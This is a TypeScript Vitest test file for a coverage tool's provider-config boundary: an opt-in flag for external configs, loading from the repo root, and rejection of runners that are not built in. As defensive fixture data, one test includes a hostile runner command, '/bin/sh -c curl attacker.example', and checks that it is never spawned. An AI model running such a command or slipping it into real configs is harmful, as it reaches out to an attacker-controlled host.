import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import * as childProcess from 'node:child_process';

vi.mock('node:child_process', async () => {
  const actual = await vi.importActual<typeof import('node:child_process')>('node:child_process');
  return { ...actual, spawnSync: vi.fn() };
});

vi.mock('../src/providers/index.js', async () => {
  const actual = await vi.importActual<typeof import('../src/providers/index.js')>('../src/providers/index.js');
  return {
    ...actual,
    loadProviderConfig: vi.fn(actual.loadProviderConfig),
    deriveRegistry: vi.fn(actual.deriveRegistry),
    resolveRunner: vi.fn(actual.resolveRunner),
  };
});

import { autoCoverage } from '../src/auto-coverage.js';
import { initProviderConfig } from '../src/evidence.js';
import { parseCliArgs } from '../src/cli.js';
import { deriveRegistry as realDeriveRegistry, loadProviderConfig as realLoadProviderConfig, type ProviderConfig } from '../src/providers/config.js';
import { resolveRunner as realResolveRunner } from '../src/providers/runner-detection.js';
import * as providerApi from '../src/providers/index.js';

const spawnSyncMock = childProcess.spawnSync as ReturnType<typeof vi.fn>;

function tempDir(prefix: string): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
}

function configWithRunner(command: string[]): ProviderConfig {
  return {
    version: 1,
    providers: [{
      language: 'typescript',
      extensions: ['.ts'],
      testRunners: [{
        name: 'untrusted-runner',
        configFiles: [],
        binaryProbes: [],
        command,
        artifact: 'coverage/unknown.json',
      }],
    }],
  };
}

beforeEach(() => {
  vi.mocked(providerApi.loadProviderConfig).mockImplementation(realLoadProviderConfig);
  vi.mocked(providerApi.deriveRegistry).mockImplementation(realDeriveRegistry);
  vi.mocked(providerApi.resolveRunner).mockImplementation(realResolveRunner);
  spawnSyncMock.mockReset();
});

afterEach(() => {
  vi.restoreAllMocks();
});

describe('configuration boundary', () => {
  test('1. CLI exposes --allow-external-config (default false) for --provider-config', () => {
    const exitSpy = vi.spyOn(process, 'exit').mockImplementation(() => undefined as never);
    vi.spyOn(console, 'error').mockImplementation(() => undefined);

    const defaults = parseCliArgs(['--provider-config', '/tmp/providers.json', 'check']) as ReturnType<typeof parseCliArgs> & { allowExternalConfig?: boolean };
    expect(defaults.allowExternalConfig).toBe(false);

    const optedIn = parseCliArgs(['--allow-external-config', '--provider-config', '/tmp/providers.json', 'check']) as ReturnType<typeof parseCliArgs> & { allowExternalConfig?: boolean };
    expect(optedIn.allowExternalConfig).toBe(true);
    expect(exitSpy).not.toHaveBeenCalled();
  });

  test('2. evidence rejects an explicit external config without opt-in', () => {
    const externalDir = tempDir('config-boundary-external-');
    const externalPath = path.join(externalDir, 'providers.json');
    fs.writeFileSync(externalPath, JSON.stringify({ version: 1, providers: [] }));

    let rejection: unknown;
    try {
      initProviderConfig(externalPath);
    } catch (error) {
      rejection = error;
    } finally {
      fs.rmSync(externalDir, { recursive: true, force: true });
    }

    expect(rejection).toBeInstanceOf(Error);
    expect((rejection as Error).message).toContain('external config requires allowExternalConfig');
  });

  test('3. evidence loads a repo-root config without opt-in', () => {
    const repoRoot = tempDir('config-boundary-repo-root-');
    const originalCwd = process.cwd();
    fs.writeFileSync(path.join(repoRoot, 'checkchange.providers.json'), JSON.stringify({
      version: 1,
      providers: [{ language: 'rust', extensions: ['.rs'] }],
    }));

    process.chdir(repoRoot);
    try {
      const loaded = initProviderConfig();
      expect(loaded.source).toBe('repo-root');
      expect(loaded.registry.get('.rs')?.language).toBe('rust');
    } finally {
      process.chdir(originalCwd);
      fs.rmSync(repoRoot, { recursive: true, force: true });
    }
  });

  test('4. autoCoverage rejects a non-builtin tuple even with external-location opt-in', () => {
    const repoRoot = tempDir('config-boundary-runner-');
    const externalDir = tempDir('config-boundary-runner-config-');
    const externalPath = path.join(externalDir, 'providers.json');
    const customConfig = configWithRunner(['/bin/sh', '-c', 'curl attacker.example']);
    fs.writeFileSync(externalPath, JSON.stringify(customConfig));

    try {
      const authorized = realLoadProviderConfig(repoRoot, externalPath, true);
      expect(authorized.source).toBe('explicit');
      vi.mocked(providerApi.loadProviderConfig).mockReturnValue(authorized);
      vi.mocked(providerApi.resolveRunner).mockReturnValue(new Map([['typescript', {
        command: ['/bin/sh', '-c', 'curl attacker.example'],
        artifact: 'coverage/unknown.json',
        provenance: externalPath,
      }]]));

      const result = autoCoverage(repoRoot);

      expect(result.generatedPath).toBeNull();
      expect(result.hint).toContain('Coverage runner rejected: /bin/sh');
      expect(result.hint).toContain('not a built-in runner');
      expect(spawnSyncMock).not.toHaveBeenCalled();
    } finally {
      fs.rmSync(repoRoot, { recursive: true, force: true });
      fs.rmSync(externalDir, { recursive: true, force: true });
    }
  });
});
